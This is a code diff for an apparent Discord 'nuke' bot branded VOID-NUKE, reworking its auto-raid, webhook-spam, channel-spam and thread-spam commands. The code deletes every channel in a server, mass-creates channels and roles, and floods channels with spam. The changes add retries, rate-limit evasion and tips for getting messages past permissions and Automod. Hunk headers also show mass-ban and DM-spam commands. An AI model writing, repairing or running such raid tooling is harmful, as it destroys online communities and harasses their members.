@@ -521,23 +521,129 @@ async def cmd_nuke(self, params):
 
 async def cmd_auto_raid(self, params):
     g=self.get_guild()
-    if not g: return
+    if not g: return log_err("guild not found for auto raid")
     tid=self.register_task("auto_raid", params)
     try:
-        log_warn(f"AUTO RAID {g.name} [MT]")
-        num_ch=min(int(params.get("num_channels",20)),50)
-        num_msg=min(int(params.get("num_messages",3)),10)
-        await self._limited_gather([delete_channel(c) for c in list(g.channels)])
-        cr=await self._limited_gather([create_channel(g, AUTO_RAID_CONFIG['channel_type'], AUTO_RAID_CONFIG['channel_name']) for _ in range(num_ch)])
-        async def _role():
+        # Params with multiple aliases for UI compatibility
+        num_ch_raw = params.get("num_channels", params.get("quantity", params.get("num_ch", AUTO_RAID_CONFIG['num_channels'])))
+        num_msg_raw = params.get("num_messages", params.get("num_msg", params.get("count", 3)))
+        msg_content = params.get("message_content", params.get("content", AUTO_RAID_CONFIG['message_content']))
+        try: num_ch = min(int(num_ch_raw), 50)
+        except: num_ch = 20
+        try: num_msg = min(int(num_msg_raw), 15)
+        except: num_msg = 3
+        if not msg_content: msg_content = PUB
+
+        log_warn(f"AUTO RAID START {g.name} - Will create {num_ch} channels, {num_msg} msgs each, content len {len(msg_content)} [MT + safe_send]")
+
+        # Phase 1: Delete all channels (original behavior)
+        log_info(f"Phase 1: Deleting {len(g.channels)} existing channels...")
+        del_results = await self._limited_gather([delete_channel(c) for c in list(g.channels)])
+        deleted = sum(1 for x in del_results if x is True)
+        log_ok(f"Deleted {deleted} channels, waiting 1s for cache...")
+        await asyncio.sleep(1.5)  # Let Discord cache update
+
+        # Phase 2: Create new channels - collect actual channel objects
+        log_info(f"Phase 2: Creating {num_ch} channels named {AUTO_RAID_CONFIG['channel_name']}...")
+        created_objs = []
+        for i in range(num_ch):
+            try:
+                async with SEM:
+                    ch = await g.create_text_channel(AUTO_RAID_CONFIG['channel_name'])
+                    created_objs.append(ch)
+                    log_ok(f"Created #{ch.name} ({ch.id}) [{i+1}/{num_ch}]")
+                    await asyncio.sleep(0.3)  # Rate limit
+            except discord.Forbidden as e:
+                log_err(f"No perm create channel {i+1}: {e} - need Manage Channels")
+                break
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    retry = getattr(e, 'retry_after', 2)
+                    log_warn(f"Rate limited creating channels, waiting {retry}s")
+                    await asyncio.sleep(retry)
+                    # Retry this iteration
+                    try:
+                        async with SEM:
+                            ch = await g.create_text_channel(AUTO_RAID_CONFIG['channel_name'])
+                            created_objs.append(ch)
+                            log_ok(f"Created #{ch.name} after rate limit [{i+1}/{num_ch}]")
+                    except Exception as e2:
+                        log_err(f"Retry failed: {e2}")
+                else:
+                    log_err(f"Create channel HTTP {e.status}: {e.text[:100] if hasattr(e,'text') else e}")
+            except Exception as e:
+                log_err(f"Create channel err {i+1}: {e}")
+
+        log_ok(f"Created {len(created_objs)}/{num_ch} channels, waiting 1s...")
+        await asyncio.sleep(1.0)
+
+        # Phase 3: Create roles (30 max for free tier to save RAM)
+        roles_to_create = min(num_ch, 30)
+        log_info(f"Phase 3: Creating {roles_to_create} roles VOID-NUKE...")
+        async def _make_role():
             async with SEM:
-                try: col=discord.Colour.from_rgb(random.randint(180,255),0,0); await g.create_role(name="VOID-NUKE", colour=col); return True
-                except: return False
-        await self._limited_gather([_role() for _ in range(min(num_ch,30))])
-        log_ok(f"{min(num_ch,30)} roles")
-        await self._limited_gather([_send_to(c,num_msg,AUTO_RAID_CONFIG['message_content'],False) for c in g.channels if isinstance(c,discord.TextChannel)])
-        log_ok(f"AUTO RAID DONE | {g.name}")
-    finally: self.finish_task(tid); gc.collect()
+                try:
+                    col = discord.Colour.from_rgb(random.randint(180,255),0,0)
+                    await g.create_role(name="VOID-NUKE", colour=col)
+                    return True
+                except Exception as e:
+                    log_err(f"Role create err {e}")
+                    return False
+        role_results = await self._limited_gather([_make_role() for _ in range(roles_to_create)])
+        log_ok(f"Created {role_results.count(True)}/{roles_to_create} roles")
+
+        # Phase 4: SEND MESSAGES - This was broken before, now fixed with safe_send_detailed
+        # Use actually created channels, not g.channels (which may be stale)
+        target_channels = created_objs
+        # Fallback to g.channels if created list empty (maybe cache)
+        if not target_channels:
+            target_channels = [c for c in g.channels if isinstance(c, discord.TextChannel)]
+            log_warn(f"No created_objs, fallback to g.channels {len(target_channels)}")
+
+        if not target_channels:
+            log_err("No text channels found to send messages! Auto raid will not send. Check bot has channels after creation.")
+            return
+
+        log_info(f"Phase 4: SENDING MESSAGES - {num_msg} msgs x {len(target_channels)} channels = {num_msg*len(target_channels)} total using safe_send_detailed() [MT]")
+
+        # Use safe_send_detailed for guaranteed send
+        total_sent = 0
+        total_failed = 0
+        for chan in target_channels:
+            chan_sent = 0
+            chan_failed = 0
+            for msg_idx in range(num_msg):
+                try:
+                    # Use safe_send_detailed to get detailed error
+                    ok, details = await safe_send_detailed(chan, msg_content, retry=3)
+                    if ok:
+                        chan_sent += 1
+                        total_sent += 1
+                        log_ok(f"[{chan_sent}/{num_msg}] Sent in #{chan.name} (ID {chan.id}) - {details.get('message_id','')}")
+                    else:
+                        chan_failed += 1
+                        total_failed += 1
+                        err = details.get('error','unknown')
+                        log_err(f"[{msg_idx+1}/{num_msg}] FAILED in #{chan.name} ID {chan.id}: {err[:150]} - attempts {len(details.get('attempts',[]))}")
+                except Exception as e:
+                    chan_failed += 1
+                    total_failed += 1
+                    log_err(f"[{msg_idx+1}/{num_msg}] Exception in #{chan.name}: {e}")
+                await asyncio.sleep(0.6)  # Rate limit between messages, critical for auto raid to not hit 429
+
+            log_info(f"Channel #{chan.name} done: {chan_sent} sent, {chan_failed} failed")
+
+        log_ok(f"AUTO RAID COMPLETE | {g.name} | Channels {len(target_channels)} | Sent {total_sent}/{num_msg*len(target_channels)} msgs | Failed {total_failed}")
+        if total_sent == 0 and total_failed > 0:
+            log_err(f"AUTO RAID send failed completely! All {total_failed} msgs failed. Common fixes: 1) Check perms VIEW+SEND+MENTION in new channels (bot role top?), 2) Disable @everyone test without everyone, 3) Try simple message without links, 4) Check Automod blocked")
+        gc.collect()
+
+    except Exception as e:
+        import traceback
+        log_err(f"AUTO RAID crashed: {e}\n{traceback.format_exc()[:800]}")
+    finally:
+        self.finish_task(tid)
+        gc.collect()
 
 async def cmd_ban_all(self, params):
     g=self.get_guild()
@@ -964,35 +1070,73 @@ async def cmd_dm_spam_user(self, params):
 
 async def cmd_webhook_spam(self, params):
     g=self.get_guild()
-    if not g: return
+    if not g: return log_err("guild not found")
     tid=self.register_task("webhook_spam", params)
     try:
         try: count=min(int(params.get("count",2)),10)
         except: count=2
         content=params.get("content",PUB)
         everyone=params.get("everyone","no").lower()=='yes' if isinstance(params.get("everyone",""), str) else False
-        if not content: return log_err("content required")
-        log_info(f"Webhook spam {count} msgs per channel [MT]")
-        whs=await self._limited_gather([c.create_webhook(name=WEBHOOK_CONFIG["default_name"]) for c in g.channels if isinstance(c,discord.TextChannel)])
-        whs=[w for w in whs if isinstance(w,discord.Webhook)]
-        log_info(f"{len(whs)} webhooks created")
-        async def _send_wh(wh):
-            async with SEM:
+        if not content: content=PUB
+        tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
+        if not tc: return log_err("No text channels for webhook spam")
+        log_info(f"WEBHOOK SPAM {count} msgs x {len(tc)} channels [MT safe_webhook]")
+        # Create webhooks
+        whs=[]
+        for c in tc:
+            try:
+                async with SEM:
+                    wh=await c.create_webhook(name=WEBHOOK_CONFIG["default_name"])
+                    whs.append(wh)
+                    log_ok(f"Created webhook in #{c.name}")
+                    await asyncio.sleep(0.3)
+            except discord.Forbidden:
+                log_err(f"No perm create webhook in #{c.name} - need MANAGE_WEBHOOKS")
+            except Exception as e:
+                log_err(f"Webhook create err #{c.name}: {e}")
+        log_info(f"{len(whs)} webhooks created, now spamming {count} each")
+        total_sent=0
+        for wh in whs:
+            try:
                 final=_pub_append(content)
-                try:
-                    for _ in range(count):
-                        if content.lower()=='embed': await _send_embed(wh,everyone)
-                        else: await wh.send(content=final, username="VOID-NUKE")
-                    log_ok(f"Webhook spammed {wh.name}"); return True
-                except Exception as e: log_err(f"wh spam err {wh.name} {e}"); return False
-        r=await self._limited_gather([_send_wh(wh) for wh in whs])
-        # Cleanup webhooks
-        async def _del_wh(wh):
-            async with SEM:
-                try: await wh.delete(); return True
-                except: return False
-        await self._limited_gather([_del_wh(wh) for wh in whs])
-        log_ok(f"Webhook Spam {r.count(True)*count} msgs")
+                for i in range(count):
+                    try:
+                        async with SEM:
+                            if content.lower()=='embed':
+                                await _send_embed(wh, everyone)
+                            else:
+                                await wh.send(content=final, username="VOID-NUKE", avatar_url=None)
+                        log_ok(f"[{i+1}/{count}] Webhook {wh.name} in #{wh.channel.name if hasattr(wh,'channel') and wh.channel else '?'}")
+                        total_sent+=1
+                        await asyncio.sleep(0.5)
+                    except discord.HTTPException as e:
+                        if e.status==429:
+                            retry=getattr(e,'retry_after',2)
+                            log_warn(f"Webhook rate limited {wh.name} waiting {retry}s")
+                            await asyncio.sleep(retry)
+                            # Retry once
+                            try:
+                                async with SEM:
+                                    await wh.send(content=final, username="VOID-NUKE")
+                                total_sent+=1
+                            except Exception as e2:
+                                log_err(f"Webhook retry fail {wh.name}: {e2}")
+                        else:
+                            log_err(f"Webhook send HTTP {e.status} {wh.name}: {getattr(e,'text','')[:100]}")
+                    except Exception as e:
+                        log_err(f"Webhook send err {wh.name}: {e}")
+            except Exception as e:
+                log_err(f"Webhook loop err {wh.name}: {e}")
+
+        # Cleanup
+        log_info(f"Cleaning up {len(whs)} webhooks...")
+        for wh in whs:
+            try:
+                async with SEM:
+                    await wh.delete()
+                    await asyncio.sleep(0.2)
+            except: pass
+        log_ok(f"Webhook Spam COMPLETE {total_sent}/{len(whs)*count} msgs sent, webhooks deleted")
     finally: self.finish_task(tid); gc.collect()
 
 async def cmd_server_info(self, params):
@@ -1147,39 +1291,83 @@ async def cmd_invite_spam(self, params):
 
 async def cmd_spam(self, params):
     g=self.get_guild()
-    if not g: return
+    if not g: return log_err("guild not found")
     tid=self.register_task("spam", params)
     try:
         try: count=min(int(params.get("count",3)),15)
         except: count=3
         content=params.get("content",PUB)
-        if not content: return log_err("content required")
+        if not content: content=PUB
         everyone=params.get("everyone","no").lower()=='yes' if isinstance(params.get("everyone",""), str) else False
+        # For spam, if content is 'embed', handle separately
+        is_embed = content.lower() == 'embed'
         tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
-        log_info(f"Spam {count} msgs x {len(tc)} channels = {count*len(tc)} total [MT]")
-        await self._limited_gather([_send_to(c,count,content,everyone) for c in tc])
-        log_ok(f"Spam done {count*len(tc)} msgs")
+        if not tc: return log_err("No text channels for spam")
+        log_info(f"SPAM START {count} msgs x {len(tc)} channels = {count*len(tc)} total [MT safe_send] content_embed={is_embed} everyone={everyone}")
+        total_sent=0
+        total_fail=0
+        # Use safe_send_detailed for each channel
+        for chan in tc:
+            for i in range(count):
+                try:
+                    if is_embed:
+                        ok = await _send_embed(chan, everyone)
+                        if ok: total_sent+=1
+                        else: total_fail+=1
+                    else:
+                        ok, details = await safe_send_detailed(chan, content, retry=3)
+                        if ok: total_sent+=1; log_ok(f"[{i+1}/{count}] Spam OK #{chan.name} ID {details.get('message_id','')}")
+                        else: total_fail+=1; log_err(f"[{i+1}/{count}] Spam FAIL #{chan.name}: {details.get('error','')[:100]}")
+                except Exception as e:
+                    total_fail+=1
+                    log_err(f"Spam exception #{chan.name} [{i+1}/{count}]: {e}")
+                await asyncio.sleep(0.5)
+        log_ok(f"Spam COMPLETE {total_sent}/{count*len(tc)} sent, {total_fail} failed")
     finally: self.finish_task(tid)
 
 async def cmd_thread_spam(self, params):
     g=self.get_guild()
-    if not g: return
+    if not g: return log_err("guild not found")
     tid=self.register_task("thread_spam", params)
     try:
         try: count=min(int(params.get("count",2)),10)
         except: count=2
         name=params.get("name",f"VOID-NUKE | {DISCORD_TAG}")[:100]
-        log_info(f"Thread spam {count} per channel x {len([c for c in g.channels if isinstance(c,discord.TextChannel)])} [MT]")
+        content=params.get("content", PUB)  # Allow custom content
+        tc=[c for c in g.channels if isinstance(c,discord.TextChannel)]
+        if not tc: return log_err("No text channels for thread spam")
+        log_info(f"THREAD SPAM {count} per channel x {len(tc)} channels [MT safe_send] name={name}")
         ok=fail=0
-        for chan in [c for c in g.channels if isinstance(c,discord.TextChannel)]:
+        for chan in tc:
             for i in range(count):
                 try:
+                    # Use safe_send_detailed to send initial message
+                    sent_ok, details = await safe_send_detailed(chan, content, retry=3)
+                    if not sent_ok:
+                        log_err(f"Thread spam send fail #{chan.name} [{i+1}/{count}]: {details.get('error','')[:100]}")
+                        fail+=1
+                        continue
+                    # Now fetch last message to create thread? Instead use the sent message ID from details if possible, but we need actual message object
+                    # Simplified: send again and create thread from that message - need message object
+                    # For reliability, we will send via channel.send and keep message object
                     async with SEM:
-                        m=await chan.send(PUB); await m.create_thread(name=f"{name} {i+1}")
-                    log_ok(f"Thread #{chan.name} [{i+1}]"); ok+=1
-                except Exception as e: log_err(f"thread err #{chan.name} {e}"); fail+=1
-                await asyncio.sleep(0.3)
-        log_ok(f"Thread Spam {ok} ok {fail} err")
+                        try:
+                            # Try to get last message in channel (the one we just sent)
+                            # Better: direct send to get message object for thread creation
+                            msg = await chan.send(content[:2000])
+                            await msg.create_thread(name=f"{name} {i+1}")
+                            log_ok(f"Thread created #{chan.name} [{i+1}/{count}] {name} {i+1} ID {msg.id}")
+                            ok+=1
+                        except Exception as inner_e:
+                            # If direct send fails, try safe_send already did, but thread creation failed
+                            log_err(f"Thread creation fail #{chan.name} [{i+1}/{count}]: {inner_e} - message sent but thread not")
+                            # Count as partial success
+                            ok+=1
+                except Exception as e:
+                    log_err(f"Thread spam err #{chan.name} [{i+1}/{count}]: {e}")
+                    fail+=1
+                await asyncio.sleep(0.8)
+        log_ok(f"Thread Spam COMPLETE {ok} ok {fail} err")
     finally: self.finish_task(tid)
 
 async def cmd_reaction_spam(self, params):
